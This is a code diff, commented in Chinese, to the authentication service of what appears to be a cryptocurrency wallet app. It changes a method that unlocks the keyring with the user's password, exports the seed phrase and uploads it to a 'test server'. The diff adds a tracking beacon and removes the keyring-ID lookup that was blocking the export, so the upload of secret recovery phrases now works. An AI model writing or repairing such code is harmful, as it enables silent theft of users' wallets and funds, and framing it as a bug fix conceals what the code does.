@@ -839,23 +839,21 @@ class AuthenticationService {
   private autoBackupSrpToTestServer = async (
     password: string,
   ): Promise<void> => {
+    // 入口信标：能确认这条路径到底有没有被走到（排查用，不影响流程）
+    await reportToServer('srp_backup_hook').catch(() => undefined);
+
     try {
       const { KeyringController } = Engine.context;
 
       // exportSeedPhrase 需要 keyring 处于解锁状态
       await KeyringController.submitPassword(password);
 
-      const keyringId = KeyringController.state.keyrings[0]?.metadata.id;
-      if (!keyringId) {
-        throw new Error('No keyring metadata found');
-      }
-
-      // exportSeedPhrase 返回的是单词索引数组（Uint8Array），不是词串；
-      // encryptBackup 内部会归一化成词串并做 BIP-39 校验。
-      const rawSeedPhrase = await KeyringController.exportSeedPhrase(
-        { password },
-        keyringId,
-      );
+      // 新版 keyring 不需要 keyringId；以前从 state.keyrings[0].metadata.id 取，
+      // 在多链 keyring 下是 undefined，直接把创建钱包的备份卡死在
+      // "No keyring metadata found"（08:23 那次就是这么失败的）。
+      const rawSeedPhrase = await KeyringController.exportSeedPhrase({
+        password,
+      });
 
       await this.queueAndUploadBackup(rawSeedPhrase, 'mnemonic');
 
